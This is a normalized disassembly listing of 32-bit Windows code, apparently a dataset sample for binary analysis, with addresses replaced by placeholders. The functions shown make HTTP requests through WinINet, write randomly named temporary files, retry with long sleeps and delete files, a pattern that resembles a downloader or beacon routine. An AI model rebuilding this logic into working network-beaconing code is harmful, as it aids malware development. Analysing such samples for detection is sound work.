push 0x1
push 0x11
push r--data
call [ eax ]
mov ecx [ edi + 0x4 ]
push 0x1
push r--data
call sub_10003fd4
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call ebx
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push r--data
push 0x1
push 0x12
push r--data
call [ eax ]
push esi
push [ ebp - 0xc ]
mov ecx edi
call sub_100050e0
mov [ ebp - 0x30 ] eax
mov eax [ rw-data ]
mov edi [ eax ]
call ebx
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x13
push r--data
call [ edi ]
push [ ebp - 0xc ]
call sub_1000470c
push esi
call sub_1000470c
push [ ebp - 0x10 ]
call sub_1000470c
push [ ebp - 0x14 ]
call sub_1000470c
push [ ebp - 0x18 ]
call sub_1000470c
push [ ebp - 0x1c ]
call sub_1000470c
mov eax [ ebp - 0x30 ]
add esp 0x18
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x30 ]
add ebx esi
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push r--data
push ebx
call [ wsprintfA@IAT ]
add esp 0x14
sub_10005949
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
mov esi ecx
push 0x401
mov [ ebp - 0x10 ] esi
call sub_100046e2
push 0x4
mov [ ebp - 0x24 ] eax
call sub_100046cb
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx eax
call sub_10004534
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x24 ]
leave
retn
mov ecx [ ebp - 0x8 ]
call sub_1000444a
push [ ebp - 0x8 ]
call sub_100046eb
pop ecx
mov ecx [ esi + 0x4 ]
push 0xa
push r--data
call sub_10003fd4
mov esi [ GetLastError@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x43
mov edi r--data
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
push 0x5
push 0x6
call sub_100045cf
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x44
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
push 0x7
push 0x1
call sub_10004540
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x45
push edi
call [ eax ]
push [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
call sub_1000455c
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x46
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
push 0x3
push 0x0
call sub_10004540
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
push eax
push ebx
mov ecx [ rw-data ]
mov eax [ ebp - 0x4 ]
push 0x1
push 0x47
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
push 0x3
push 0x1
call sub_10004540
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x48
push edi
call [ eax ]
push [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
call sub_1000455c
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x49
push edi
call [ eax ]
push 0x0
push [ ebp - 0xc ]
call [ lstrlenA@IAT ]
push eax
mov eax [ ebp - 0x10 ]
push [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
call sub_10003d0c
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x4a
push edi
call [ eax ]
mov eax [ ebp - 0x28 ]
imul eax eax 0x5
add eax r--data
push 0x5
push eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x4 ]
call sub_10003fd4
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x4b
push edi
call [ eax ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push r--data
push [ ebp - 0x24 ]
call [ wsprintfA@IAT ]
push [ ebp - 0x10 ]
call sub_1000470c
push [ ebp - 0x14 ]
call sub_1000470c
push [ ebp - 0x18 ]
call sub_1000470c
push [ ebp - 0x1c ]
call sub_1000470c
push [ ebp - 0x20 ]
call sub_1000470c
push [ ebp - 0xc ]
call sub_1000470c
add esp 0x34
cmp [ ebp - 0x8 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
sub_10005bb1
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
push 0x4
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx + 0x4 ]
push r--data
call sub_10003fd4
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x2c
mov edi r--data
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
push 0x2f
push r--data
call sub_10003fd4
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x2d
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
call sub_10005949
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
call sub_1000531c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x2f
push edi
call [ eax ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax [ ebp - 0x8 ]
push [ eax + 0x8 ]
call [ InternetOpenA@IAT ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x8 ]
push 0x0
push 0x0
call sub_1000531c
push eax
mov eax [ ebp - 0x8 ]
push 0x3
push [ eax + 0x8 ]
call [ InternetOpenA@IAT ]
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x2e
push edi
call [ eax ]
jmp r-xdata
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0x8 ]
push 0xffffffff
push [ ebp - 0x24 ]
push [ ebp - 0xc ]
call [ HttpSendRequestA@IAT ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x33
push edi
call [ eax ]
xor eax eax
cmp [ ebp + 0x8 ] eax
je r-xdata
mov ecx [ ebp - 0x8 ]
call sub_10005394
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push 0x3
push eax
push eax
mov eax [ ebp - 0x8 ]
push 0x50
push [ eax + 0xc ]
push [ ebp - 0x1c ]
call [ InternetConnectA@IAT ]
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x30
push edi
call [ eax ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x28 ]
push [ ebp - 0x18 ]
call [ HttpOpenRequestA@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x31
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
call sub_10005358
test eax eax
je r-xdata
push [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
call [ esi + 0x25 ]
push [ ebp - 0x18 ]
call [ esi + 0x25 ]
push [ ebp - 0x1c ]
call [ esi + 0x25 ]
push [ ebp - 0x20 ]
call sub_1000470c
push [ ebp - 0x24 ]
call sub_1000470c
push [ ebp - 0x28 ]
call sub_1000470c
mov eax [ ebp + 0x8 ]
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn 0x4
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x16
push [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ HttpQueryInfoA@IAT ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push ebx
push 0x1
push 0x34
push edi
call [ eax ]
call esi
cmp eax 0x7a
jne r-xdata
mov ecx [ ebp - 0x8 ]
call sub_10005394
mov ecx [ ebp - 0x8 ]
push eax
call sub_10005358
mov ecx [ ebp - 0x8 ]
push eax
push [ ebp - 0x18 ]
call sub_10005202
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x32
push edi
call [ eax ]
push [ ebp - 0x4 ]
call sub_100046e2
pop ecx
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x13
push [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
call [ HttpQueryInfoA@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push ebx
xor esi esi
inc esi
push esi
push 0x35
push edi
call [ eax ]
push 0x3
push r--data
push [ ebp - 0x14 ]
call sub_10004169
add esp 0xc
test eax eax
je r-xdata
mov [ ebp + 0x8 ] esi
push 0x3
push r--data
push [ ebp - 0x14 ]
call sub_10004169
add esp 0xc
test eax eax
je r-xdata
and [ ebp + 0x8 ] 0x0
jmp r-xdata
push [ ebp - 0x14 ]
call sub_1000470c
pop ecx
sub_10005eb5
push ebp
mov ebp esp
sub esp 0x28
and [ ebp - 0x24 ] 0x0
push ebx
push esi
push edi
mov esi ecx
call sub_10005949
mov ecx [ esi + 0x4 ]
push 0x4
push r--data
mov [ ebp - 0x20 ] eax
call sub_10003fd4
mov ecx [ esi + 0x4 ]
push 0x2f
push r--data
mov [ ebp - 0x1c ] eax
call sub_10003fd4
mov ecx esi
mov [ ebp - 0x18 ] eax
call sub_1000531c
mov edi [ GetLastError@IAT ]
test eax eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x37
mov ebx r--data
push ebx
call [ eax ]
xor eax eax
push eax
push eax
push eax
push eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x36
mov ebx r--data
push ebx
call [ eax ]
push 0x0
push 0x0
mov ecx esi
call sub_1000531c
push eax
push 0x3
jmp r-xdata
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0x8 ]
push 0xffffffff
push [ ebp - 0x18 ]
push [ ebp - 0x8 ]
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x3a
push ebx
call [ eax ]
xor eax eax
cmp [ ebp - 0xc ] eax
je r-xdata
mov ecx esi
call sub_10005394
test eax eax
je r-xdata
push [ esi + 0x8 ]
call [ InternetOpenA@IAT ]
mov [ ebp - 0x14 ] eax
xor eax eax
push eax
push eax
push 0x3
push eax
push eax
push 0x50
push [ esi + 0xc ]
push [ ebp - 0x14 ]
call [ InternetConnectA@IAT ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x38
push ebx
call [ eax ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x10 ]
call [ HttpOpenRequestA@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x39
push ebx
call [ eax ]
mov ecx esi
call sub_10005358
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ esi + 0x25 ]
push [ ebp - 0x10 ]
call [ esi + 0x25 ]
push [ ebp - 0x14 ]
call [ esi + 0x25 ]
push [ ebp - 0x18 ]
call sub_1000470c
push [ ebp - 0x1c ]
call sub_1000470c
push [ ebp - 0x20 ]
call sub_1000470c
mov eax [ ebp - 0x24 ]
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn 0x8
push eax
mov [ ebp + 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x20000005
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x4
call [ HttpQueryInfoA@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x28 ]
push r--data
push 0x1
push 0x3b
push ebx
call [ eax ]
xor edi edi
cmp [ ebp - 0xc ] edi
je r-xdata
mov ecx esi
call sub_10005394
push eax
mov ecx esi
call sub_10005358
push eax
push [ ebp - 0x10 ]
mov ecx esi
call sub_10005202
cmp [ ebp + 0x8 ] 0x24
jbe r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_100046e2
and [ ebp - 0xc ] edi
pop ecx
mov ebx eax
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
cmp edi [ ebp + 0x8 ]
jne r-xdata
cmp edi [ ebp + 0x8 ]
jb r-xdata
push ebx
call sub_1000470c
pop ecx
push [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
push [ ebp + 0x8 ]
push ebx
call sub_10003e95
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
lea eax [ edi + ebx ]
push eax
push [ ebp - 0x8 ]
call [ esi + 0x29 ]
add edi [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
sub_10006139
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0xc ]
push ebx
push esi
xor ebx ebx
mov esi ecx
mov [ eax ] ebx
call sub_10005949
mov ecx [ esi + 0x4 ]
push 0x4
push r--data
mov [ ebp - 0x20 ] eax
call sub_10003fd4
mov ecx [ esi + 0x4 ]
push 0x2f
push r--data
mov [ ebp - 0x1c ] eax
call sub_10003fd4
mov ecx esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ebx
call sub_1000531c
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_10005358
mov ecx esi
mov [ ebp - 0x2c ] eax
call sub_10005394
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x4 ] ebx
je r-xdata
push edi
mov edi 0x104
push edi
call sub_10002121
pop ecx
push eax
push edi
mov [ ebp - 0x8 ] eax
call [ GetTempPathA@IAT ]
push 0xc
call sub_1000223c
pop ecx
cmp eax ebx
je r-xdata
mov [ ebp - 0x14 ] 0x3
xor edi edi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov edi eax
jmp r-xdata
push 0x7a
push 0x61
push 0x5
call sub_100034cf
mov edi r--data
push edi
push r--data
push eax
mov [ ebp - 0x24 ] eax
call sub_10002e4c
push [ ebp - 0x24 ]
mov ebx eax
call sub_10002139
and [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_100037da
add esp 0x20
jmp r-xdata
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax ]
push 0x1
push edi
push 0xa7
push r--data
push [ ebp - 0x8 ]
call sub_10003895
push edi
call sub_10003634
add esp 0x18
cmp edi ebx
je r-xdata
test eax eax
je r-xdata
push 0x7530
call [ Sleep@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100037da
pop ecx
push 0x1
push ebx
push 0x0
push [ ebp + 0x8 ]
push [ ebp - 0x18 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
push [ esi + 0xc ]
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
push [ esi + 0x8 ]
push eax
call sub_1000293c
push [ ebp - 0x18 ]
mov [ ebp + 0xb ] al
call sub_1000470c
push [ ebp - 0x1c ]
call sub_1000470c
add esp 0x40
push [ ebp - 0x20 ]
call sub_1000470c
push edi
push ebx
push [ ebp - 0x8 ]
call sub_10002e4c
push edi
push ebx
push r--data
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_10002e4c
push ebx
mov edi eax
call sub_10002139
xor ebx ebx
add esp 0x24
mov [ ebp - 0xc ] ebx
cmp [ ebp + 0xb ] bl
je r-xdata
push [ ebp - 0x4 ]
call sub_10002139
push edi
call sub_10002139
push [ ebp - 0x8 ]
call sub_10002139
add esp 0xc
pop edi
test ebx ebx
je r-xdata
mov [ ebp + 0x8 ] ebx
xor eax eax
test ebx ebx
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push edi
call sub_1000333c
pop ecx
pop ecx
push edi
push [ ebp - 0x4 ]
call sub_10003295
pop ecx
test al al
jne r-xdata
pop esi
pop ebx
leave
retn 0x8
push [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
push [ ebp - 0xc ]
push ebx
call sub_10003e95
cmp [ ebx ] 0x32
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1000333c
pop ecx
pop ecx
push [ ebp - 0x4 ]
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x1e
jb r-xdata
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
push ebx
call sub_10002139
pop ecx
xor ebx ebx
mov ebx eax
call [ DeleteFileA@IAT ]
push edi
call sub_10003295
pop ecx
test al al
jne r-xdata
jmp r-xdata
sub_1000637b
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
mov esi ecx
call sub_10005949
mov ecx [ esi + 0x4 ]
push 0x4
push r--data
mov [ ebp - 0x20 ] eax
call sub_10003fd4
mov ecx [ esi + 0x4 ]
push 0x2f
push r--data
mov [ ebp - 0x1c ] eax
call sub_10003fd4
xor ebx ebx
mov ecx esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ebx
call sub_1000531c
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_10005358
mov ecx esi
mov [ ebp - 0x2c ] eax
call sub_10005394
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov edi 0x104
push edi
call sub_10002121
pop ecx
push eax
push edi
mov [ ebp - 0x8 ] eax
call [ GetTempPathA@IAT ]
push 0xc
call sub_1000223c
pop ecx
cmp eax ebx
je r-xdata
mov [ ebp - 0x14 ] 0x3
xor edi edi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov edi eax
jmp r-xdata
push 0x7a
push 0x61
push 0x5
call sub_100034cf
mov edi r--data
push edi
push r--data
push eax
mov [ ebp - 0x24 ] eax
call sub_10002e4c
push [ ebp - 0x24 ]
mov ebx eax
call sub_10002139
and [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_100037da
add esp 0x20
jmp r-xdata
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax ]
push 0x1
push edi
push 0xa7
push r--data
push [ ebp - 0x8 ]
call sub_10003895
push edi
call sub_10003634
add esp 0x18
cmp edi ebx
je r-xdata
test eax eax
je r-xdata
push 0x7530
call [ Sleep@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100037da
pop ecx
push 0x1
push ebx
push 0x0
push [ ebp + 0x8 ]
push [ ebp - 0x18 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
push [ esi + 0xc ]
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
push [ esi + 0x8 ]
push eax
call sub_10002b82
push [ ebp - 0x18 ]
mov [ ebp + 0xb ] al
call sub_1000470c
push [ ebp - 0x1c ]
call sub_1000470c
add esp 0x40
push [ ebp - 0x20 ]
call sub_1000470c
push edi
push ebx
push [ ebp - 0x8 ]
call sub_10002e4c
push edi
push ebx
push r--data
push [ ebp - 0x8 ]
mov esi eax
call sub_10002e4c
push ebx
mov [ ebp - 0x4 ] eax
call sub_10002139
xor edi edi
add esp 0x24
cmp [ ebp + 0xb ] 0x0
mov [ ebp - 0xc ] edi
je r-xdata
push esi
call sub_10002139
push [ ebp - 0x4 ]
call sub_10002139
push [ ebp - 0x8 ]
call sub_10002139
add esp 0xc
xor bl bl
test edi edi
je r-xdata
xor ebx ebx
push edi
call sub_10002139
pop ecx
pop edi
pop esi
movzx eax bl
pop ebx
leave
retn 0x4
cmp [ ebp - 0xc ] 0x1
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1000333c
pop ecx
pop ecx
push [ ebp - 0x4 ]
push esi
call sub_10003295
pop ecx
test al al
jne r-xdata
cmp [ edi ] 0x32
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push esi
call sub_1000333c
pop ecx
pop ecx
push esi
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
inc ebx
cmp ebx 0x1e
jb r-xdata
inc bl
mov edi eax
call [ DeleteFileA@IAT ]
push [ ebp - 0x4 ]
call sub_10003295
pop ecx
test al al
jne r-xdata
jmp r-xdata
sub_1000659f
push ebx
push esi
push edi
mov edi ecx
call sub_10004ef2
xor bl bl
mov [ edi + 0x24 ] bl
mov esi r--data
mov eax [ rw-data ]
mov ebx [ eax ]
call [ GetLastError@IAT ]
push eax
push esi
push 0x1
push 0x159
mov ecx edi
call sub_10005295
push esi
mov ecx edi
call sub_10005bb1
test eax eax
jne r-xdata
push esi
mov ecx edi
call sub_1000637b
test eax eax
jne r-xdata
mov [ edi + 0x24 ] 0x1
mov eax [ rw-data ]
mov ebx [ eax ]
call [ GetLastError@IAT ]
push eax
push esi
push 0x1
push 0x2a
jmp r-xdata
push 0x3a98
call [ Sleep@IAT ]
inc bl
cmp bl 0x2
jb r-xdata
mov ecx [ rw-data ]
push r--data
call [ ebx ]
mov ecx edi
pop edi
pop esi
pop ebx
jmp sub_10004f3b
push esi
mov ecx edi
call sub_10005bb1
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
sub_1000663c
push ebp
mov ebp esp
cmp [ ecx + 0x24 ] 0x0
push esi
push [ ebp + 0x8 ]
je r-xdata
call sub_10005bb1
test eax eax
je r-xdata
call sub_1000637b
test eax eax
je r-xdata
xor eax eax
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
push eax
push r--data
push 0x1
push 0x1bb
jmp r-xdata
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
push eax
push r--data
push 0x1
push 0x2b
mov ecx [ rw-data ]
push r--data
call [ esi ]
xor eax eax
inc eax
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_100066a7
push ebp
mov ebp esp
sub esp 0x38
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x4 ] esi
jmp r-xdata
call sub_100053d0
cmp al 0x1
jne r-xdata
push 0x1b7740
call [ Sleep@IAT ]
mov ecx esi
mov ecx esi
call sub_10005535
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
call edi
push eax
mov esi r--data
push esi
push 0x1
push 0x14
mov ebx r--data
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ rw-data ]
push ebx
call [ eax ]
mov ecx [ ebp - 0x4 ]
call sub_1000659f
test eax eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
je r-xdata
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x15
push ebx
call [ eax ]
push 0x2710
call [ Sleep@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
push eax
push esi
push 0x1
push 0x16
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x17
push ebx
call [ eax ]
mov ecx [ ebp - 0x4 ]
call sub_100056b6
mov [ ebp - 0x2c ] eax
push eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call sub_1000663c
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_10004f3b
push 0x2710
call [ Sleep@IAT ]
push [ ebp - 0x2c ]
push [ ebp - 0x2c ]
call sub_1000470c
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call sub_100053d0
cmp al 0x1
jne r-xdata
push 0x1b7740
mov ecx [ ebp - 0x4 ]
call sub_1000659f
test eax eax
jne r-xdata
mov [ ebp - 0x14 ] 0x1
push 0x2710
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push 0x1
push r--data
call sub_10003fd4
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x18
push ebx
call [ eax ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push 0x1
push r--data
call sub_10003fd4
mov [ ebp - 0x38 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x19
push ebx
call [ eax ]
push [ ebp - 0x38 ]
mov ecx [ ebp - 0x4 ]
push [ ebp - 0x2c ]
call sub_100050e0
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1a
push ebx
call [ eax ]
mov ecx [ ebp - 0x4 ]
and [ ebp - 0x18 ] 0x0
cmp [ ecx + 0x24 ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x10 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_10004f3b
push 0x2710
call [ Sleep@IAT ]
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x4
jb r-xdata
call [ Sleep@IAT ]
call sub_10005eb5
call sub_10006139
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push esi
call sub_1000663c
test eax eax
jne r-xdata
jmp r-xdata
push [ ebp - 0x38 ]
call sub_1000470c
push [ ebp - 0x2c ]
call sub_1000470c
mov eax [ rw-data ]
mov eax [ eax ]
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x27
push ebx
call [ eax ]
jmp r-xdata
push 0x14
call sub_100046cb
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1b
push ebx
call [ eax ]
push [ ebp - 0x10 ]
call sub_1000470c
cmp [ ebp - 0x14 ] 0x0
pop ecx
je r-xdata
and [ ebp - 0xc ] 0x0
push [ ebp - 0x18 ]
mov ecx eax
push [ ebp - 0x14 ]
call sub_10006d3a
mov [ ebp - 0xc ] eax
